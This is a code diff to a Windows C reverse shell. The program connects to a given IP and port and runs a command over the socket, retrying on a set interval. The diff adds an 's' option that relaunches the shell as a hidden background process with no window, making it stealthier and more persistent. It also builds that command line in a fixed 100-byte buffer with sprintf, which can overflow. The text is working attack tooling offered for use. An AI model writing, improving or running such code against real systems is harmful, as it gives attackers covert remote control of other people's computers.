@@ -2,6 +2,7 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <stdbool.h>
+#include <string.h>
 #include <winsock2.h>
 #include <windows.h>
 #include <process.h>
@@ -10,22 +11,45 @@
 int main (int argc, char *argv[]){
       
     if (argc < 4){
-        printf ("Usage: %s IP PORT CMD [retry interval (s)]\n", argv[0]);
-	printf ("If the retry interval is not specified the shell will be executed only once\n", argv[0]);
-        return 1;
+        printf ("Usage: %s IP PORT CMD [retry interval (ms)] [s]\n", argv[0]);
+	printf ("If the retry interval is not specified the shell will be executed only once\n");
+        printf ("By specifying s as last parameter the shell will be spawned as a subprocess\n");
+	return 1;
     }
       
     char *ip = argv[1];
     unsigned short port = atoi (argv[2]);
     char *cmd = argv[3];
     unsigned short callback = 5000;
-	bool defaultCallback = 1;
+    bool defaultCallback = 1;
       
      
-    if (argc == 5){
-        callback = atoi (argv[4])*1000;
+    if (argc >= 5){
+        callback = atoi (argv[4]);
         defaultCallback = 0;
     }
+	if(strcmp (argv[argc-1], "s") == 0){
+		char cmd_copy[100];
+		sprintf(cmd_copy, "%s %s %d %s %d", argv[0], ip, port, cmd, callback);
+		STARTUPINFO si_sub;
+		PROCESS_INFORMATION pi_sub;
+
+		ZeroMemory( &si_sub, sizeof(si_sub));
+		si_sub.cb = sizeof(si_sub);
+		ZeroMemory( &pi_sub, sizeof(pi_sub));
+		
+		if(CreateProcessA (NULL, cmd_copy, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si_sub, &pi_sub)){
+			printf("subprocess started as %s with PID: %d\n",cmd_copy,GetProcessId(pi_sub.hProcess));
+		}
+		else{
+			printf("subprocess creation failed\n");
+			return 1;
+		}
+		
+		CloseHandle (pi_sub.hProcess);
+		CloseHandle (pi_sub.hThread);
+		return 0;
+	}
       
     WSADATA wsaData;
     if (WSAStartup (MAKEWORD (2, 2), &wsaData) != 0){
@@ -81,6 +105,7 @@ int main (int argc, char *argv[]){
         }
         close (sc);
         CloseHandle (pi.hProcess);
+		CloseHandle (pi.hThread);
     }
     return 0;
 }
